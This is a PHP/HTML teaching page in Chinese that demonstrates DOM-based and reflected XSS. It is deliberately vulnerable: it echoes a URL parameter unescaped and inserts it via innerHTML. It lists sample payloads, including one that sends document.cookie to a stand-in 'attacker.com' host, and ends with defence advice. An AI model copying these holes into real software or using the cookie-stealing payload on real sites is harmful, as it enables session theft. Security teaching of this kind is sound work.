<?php
// 5_dom_based_xss.php - DOM-based XSS 示範
// ⚠️ 這個頁面故意包含 XSS 漏洞，僅供教學使用！

// DOM-based XSS 主要發生在客戶端，但我們也可以從 PHP 取得 URL 參數
$name = $_GET['name'] ?? '';
?>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DOM-based XSS 示範</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', 'Microsoft JhengHei', sans-serif;
            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 700px;
            width: 100%;
        }
        
        .warning {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            color: #856404;
        }
        
        .warning strong {
            color: #d32f2f;
        }
        
        h1 {
            color: #fa709a;
            margin-bottom: 10px;
            font-size: 28px;
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .demo-box {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .demo-title {
            font-weight: bold;
            color: #333;
            margin-bottom: 15px;
            font-size: 18px;
        }
        
        .url-display {
            background: white;
            padding: 15px;
            border-radius: 8px;
            border: 2px solid #ddd;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            word-break: break-all;
            margin-bottom: 15px;
        }
        
        #welcomeMessage {
            background: #e3f2fd;
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid #2196f3;
            margin-top: 20px;
            font-size: 18px;
            min-height: 60px;
        }
        
        .explanation {
            background: #fff8e1;
            border-left: 4px solid #ffa726;
            padding: 15px;
            margin-top: 20px;
            border-radius: 5px;
        }
        
        .explanation h3 {
            color: #e65100;
            margin-bottom: 10px;
            font-size: 16px;
        }
        
        .explanation p {
            color: #333;
            line-height: 1.6;
            margin-bottom: 10px;
        }
        
        .code-block {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            overflow-x: auto;
        }
        
        .code-block .comment {
            color: #75715e;
        }
        
        .code-block .keyword {
            color: #f92672;
        }
        
        .code-block .function {
            color: #66d9ef;
        }
        
        .code-block .string {
            color: #e6db74;
        }
        
        .payload-examples {
            background: #ffebee;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
        }
        
        .payload-examples h3 {
            color: #c62828;
            margin-bottom: 10px;
            font-size: 16px;
        }
        
        .payload-examples code {
            display: block;
            background: white;
            padding: 10px;
            border-radius: 5px;
            margin: 8px 0;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            word-break: break-all;
        }
        
        button {
            background: #fa709a;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
            transition: background 0.3s;
        }
        
        button:hover {
            background: #e85d88;
        }
        
        .method-box {
            background: #f3e5f5;
            border: 2px solid #9c27b0;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
        }
        
        .method-box h3 {
            color: #9c27b0;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">
            <strong>⚠️ 警告：</strong> 這是 DOM-based XSS 漏洞示範（PHP 加強版），僅供教學使用！
        </div>
        
        <h1>🌐 DOM-based XSS（PHP 版本）</h1>
        <p class="subtitle">透過修改 URL 參數觸發的 XSS 攻擊</p>
        
        <div class="demo-box">
            <div class="demo-title">📍 當前 URL：</div>
            <div class="url-display" id="currentUrl"></div>
            <button onclick="refreshUrl()">🔄 重新載入 URL</button>
        </div>
        
        <div id="welcomeMessage"></div>
        
        <!-- 方法一：JavaScript DOM 操作（純前端） -->
        <div class="method-box">
            <h3>方法一：JavaScript DOM 操作</h3>
            <p>使用 JavaScript 讀取 URL 參數並直接插入到 DOM</p>
        </div>
        
        <!-- 方法二：PHP 直接輸出（伺服器端） -->
        <?php if (!empty($name)): ?>
        <div class="method-box" style="border-color: #f44336; background: #ffebee;">
            <h3 style="color: #f44336;">方法二：PHP 伺服器端輸出</h3>
            <p>PHP 直接從 URL 取得參數並輸出到 HTML：</p>
            <div style="background: white; padding: 15px; border-radius: 8px; margin-top: 10px;">
                <!-- ❌ 危險！PHP 直接輸出 URL 參數 -->
                👋 歡迎，<strong><?php echo $name; ?></strong>！
            </div>
        </div>
        <?php endif; ?>
        
        <div class="explanation">
            <h3>💡 什麼是 DOM-based XSS？</h3>
            <p>
                <strong>DOM-based XSS</strong> 通常發生在客戶端，當 JavaScript 讀取 URL 參數、
                Cookie 或其他客戶端資料，並直接插入到 DOM 中時就會觸發。
            </p>
            <p>
                <strong>PHP 版本的特點：</strong>可以同時展示兩種攻擊方式：
            </p>
            <ul style="margin-left: 20px; margin-top: 10px;">
                <li>前端 JavaScript 直接操作 DOM（純客戶端）</li>
                <li>後端 PHP 直接輸出到 HTML（伺服器端渲染）</li>
            </ul>
        </div>
        
        <div class="code-block">
<span class="comment">// JavaScript 不安全的程式碼</span>
<span class="keyword">function</span> <span class="function">showWelcome</span>() {
    <span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(window.location.search);
    <span class="keyword">var</span> name = params.get(<span class="string">'name'</span>);
    
    <span class="keyword">if</span> (name) {
        <span class="comment">// ❌ 危險！使用 innerHTML</span>
        document.getElementById(<span class="string">'welcomeMessage'</span>).innerHTML = 
            <span class="string">'👋 歡迎，&lt;strong&gt;'</span> + name + <span class="string">'&lt;/strong&gt;！'</span>;
    }
}

<span class="comment">// PHP 不安全的程式碼</span>
<span class="comment">// ❌ 危險！直接 echo URL 參數</span>
<span class="keyword">echo</span> <span class="keyword">$_GET</span>[<span class="string">'name'</span>];
        </div>
        
        <div class="payload-examples">
            <h3>🧪 測試 Payload：</h3>
            <p>在瀏覽器網址列輸入以下 URL：</p>
            <code><?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>?name=&lt;script&gt;alert('DOM XSS')&lt;/script&gt;</code>
            <code><?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>?name=&lt;img src=x onerror=alert('XSS成功')&gt;</code>
            <code><?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>?name=&lt;svg onload=alert(document.cookie)&gt;</code>
            <code><?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>?name=&lt;iframe src="javascript:alert('XSS')"&gt;</code>
            
            <p style="margin-top: 15px;"><strong>進階 Payload（竊取 Cookie）：</strong></p>
            <code><?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>?name=&lt;img src=x onerror="fetch('http://attacker.com?c='+document.cookie)"&gt;</code>
        </div>
        
        <div class="explanation" style="margin-top: 20px; background: #e8f5e9; border-left-color: #4caf50;">
            <h3 style="color: #2e7d32;">🛡️ 如何防禦？</h3>
            <p><strong>JavaScript 端：</strong></p>
            <ul style="margin-left: 20px;">
                <li>使用 <code>textContent</code> 而非 <code>innerHTML</code></li>
                <li>對 URL 參數進行 HTML 編碼</li>
                <li>驗證和過濾輸入</li>
            </ul>
            <p style="margin-top: 10px;"><strong>PHP 端：</strong></p>
            <ul style="margin-left: 20px;">
                <li>使用 <code>htmlspecialchars($var, ENT_QUOTES, 'UTF-8')</code></li>
                <li>永遠不要直接 echo $_GET、$_POST、$_REQUEST</li>
                <li>設定 Content-Security-Policy Header</li>
            </ul>
        </div>
    </div>
    
    <script>
        // 顯示當前 URL
        function refreshUrl() {
            document.getElementById('currentUrl').textContent = window.location.href;
        }
        
        // 不安全的歡迎訊息顯示（DOM-based XSS 漏洞）
        function showWelcome() {
            var params = new URLSearchParams(window.location.search);
            var name = params.get('name');
            var message = document.getElementById('welcomeMessage');
            
            if (name) {
                // ❌ 危險！直接使用 innerHTML 插入來自 URL 的參數
                message.innerHTML = '👋 歡迎（JavaScript 顯示），<strong>' + name + '</strong>！';
            } else {
                message.innerHTML = '👋 歡迎！請在 URL 加上 ?name=你的名字';
            }
        }
        
        // 頁面載入時執行
        window.onload = function() {
            refreshUrl();
            showWelcome();
        };
        
        // 監聽 URL 變化
        window.onpopstate = function() {
            refreshUrl();
            showWelcome();
        };
    </script>
</body>
</html>
